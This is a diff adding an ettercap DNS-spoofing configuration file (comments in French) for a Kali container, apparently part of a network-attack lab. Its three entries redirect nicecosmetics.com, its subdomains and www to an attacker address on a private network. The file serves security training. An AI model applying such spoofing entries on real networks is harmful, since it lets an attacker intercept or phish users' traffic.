@@ -1,0 +1,11 @@
+# Configuration DNS Spoofing pour ettercap
+# À ajouter dans /etc/ettercap/etter.dns sur le conteneur Kali
+#
+# Format : domaine    TYPE    IP_redirection
+#
+# Ces entrées redirigent toutes les requêtes DNS pour
+# nicecosmetics.com vers l'IP de l'attaquant (192.168.56.12)
+
+nicecosmetics.com      A   192.168.56.12
+*.nicecosmetics.com    A   192.168.56.12
+www.nicecosmetics.com  A   192.168.56.12
